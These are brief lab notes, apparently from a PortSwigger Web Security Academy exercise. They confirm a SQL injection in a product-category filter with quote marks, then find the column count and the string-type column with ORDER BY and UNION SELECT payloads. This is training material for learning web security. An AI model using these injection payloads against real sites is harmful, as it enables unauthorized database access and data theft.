try ' in the URL with filter function:
https://0aaa009d03dad41e81e1f2b800d70015.web-security-academy.net/filter?category=Gifts'
get an error 
try '':
https://0aaa009d03dad41e81e1f2b800d70015.web-security-academy.net/filter?category=Gifts''
the error was removed so we have sqli
with our script `NumberOfColumns.py` the number of colums is 3 
Or manual via ' order by 3--
To get the colums type try: 
' UNION select 'test', NULL, NULL-- => error
' UNION select NULL, 'test', NULL-- => 200 ok
' UNION select NULL, NULL, 'test'-- => error

So the column that type is string is 2nd column

Or via the script `ColumnsTypeDetector.py`
